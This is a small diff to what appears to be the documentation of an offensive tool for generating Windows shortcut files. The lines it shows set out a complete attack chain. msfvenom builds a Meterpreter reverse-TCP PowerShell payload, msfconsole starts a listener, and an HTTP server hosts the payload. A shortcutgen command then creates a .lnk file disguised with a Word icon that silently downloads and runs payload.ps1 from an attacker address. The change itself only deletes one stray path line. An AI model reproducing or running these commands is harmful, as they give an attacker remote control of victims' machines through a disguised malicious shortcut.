@@ -57,7 +57,7 @@ $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh
 $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; exploit"
 
 $ sudo python -m http.server 80
-C:\Windows\System32\
+
 $ shortcutgen -p lnk -c "powershell.exe" -a "-nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http[s]://<attacker_IP>/payload.ps1'))\"" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
 ```
 
